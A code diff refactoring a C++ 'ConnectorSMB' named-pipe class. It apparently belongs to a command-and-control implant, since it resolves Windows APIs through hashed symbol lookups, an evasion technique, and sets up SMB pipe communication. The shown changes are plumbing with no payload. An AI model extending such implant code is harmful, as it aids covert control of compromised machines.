@@ -35,26 +35,26 @@ ConnectorSMB::ConnectorSMB()
 
 	this->functions->CreateNamedPipeA    = ApiWin->CreateNamedPipeA;
 	this->functions->DisconnectNamedPipe = ApiWin->DisconnectNamedPipe;
-	this->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
-	this->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);
+	this->functions->CancelIo            = ApiWin->CancelIo;
     
-	this->functions->AllocateAndInitializeSid     = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
-	this->functions->InitializeSecurityDescriptor = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
-	this->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
-	this->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
-	this->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
+	this->functions->FlushFileBuffers               = (decltype(FlushFileBuffers)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);
+	this->functions->AllocateAndInitializeSid       = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
+	this->functions->InitializeSecurityDescriptor   = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
+	this->functions->FreeSid                        = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
+	this->functions->SetEntriesInAclA               = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
+	this->functions->SetSecurityDescriptorDacl      = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
     
     this->functions->CreateEventA           = ApiWin->CreateEventA;
     this->functions->SetEvent               = ApiWin->SetEvent;
     this->functions->ResetEvent             = ApiWin->ResetEvent;
+    this->functions->WaitForMultipleObjects = ApiWin->WaitForMultipleObjects;
 
-	this->functions->CancelIo            = &CancelIo;
-	this->functions->GetOverlappedResult = &GetOverlappedResult;
-    this->functions->WaitForMultipleObjects = &WaitForMultipleObjects;
+	this->functions->ConnectNamedPipe       = &ConnectNamedPipe;
+	this->functions->GetOverlappedResult    = &GetOverlappedResult;
 
     this->hTermEvent      = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
-    this->ovRead.hEvent   = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL); 
-    this->hWriteEvent     = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL); 
+    this->ovRead.hEvent   = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL); // read event
+    this->hWriteEvent     = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL); // write event — kept separate
 
 }
 
@@ -196,21 +196,9 @@ void ConnectorSMB::RecvClear()
 
 void ConnectorSMB::Listen()
 {
+    while ( !this->functions->ConnectNamedPipe(this->hChannel, nullptr) && this->functions->GetLastError() != ERROR_PIPE_CONNECTED);
 
-    OVERLAPPED ovConnect = {};
-    ovConnect.hEvent     = this->ovRead.hEvent;
-    this->functions->ResetEvent(this->ovRead.hEvent);
-
-    BOOL ok = this->functions->ConnectNamedPipe(this->hChannel, &ovConnect);
-    if (!ok) {
-        DWORD err = this->functions->GetLastError();
-        if (err == ERROR_IO_PENDING) {
-            DWORD nBytes = 0;
-            this->functions->GetOverlappedResult(this->hChannel, &ovConnect, &nBytes, TRUE);
-        }
-    }
-
-    this->recvData   = (BYTE*) this->functions->LocalAlloc(LPTR, 0x100000);
+    this->recvData = (BYTE*) this->functions->LocalAlloc(LPTR, 0x100000);
     this->allocaSize = 0x100000;
 }
 
@@ -328,6 +316,7 @@ void ConnectorSMB::PostHeaderRead()
     BOOL  result = this->functions->ReadFile(this->hChannel, &this->rdHeader, 4, &nRead, &this->ovRead);
 
     if (result) {
+
         this->functions->SetEvent(this->ovRead.hEvent);
         this->rdPending = TRUE;
     }
@@ -358,6 +347,7 @@ void ConnectorSMB::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDela
 
     if (hasOutput)
         return; 
+
     HANDLE waitHandles[MAXIMUM_WAIT_OBJECTS];
     DWORD  handleCount = 0;
 
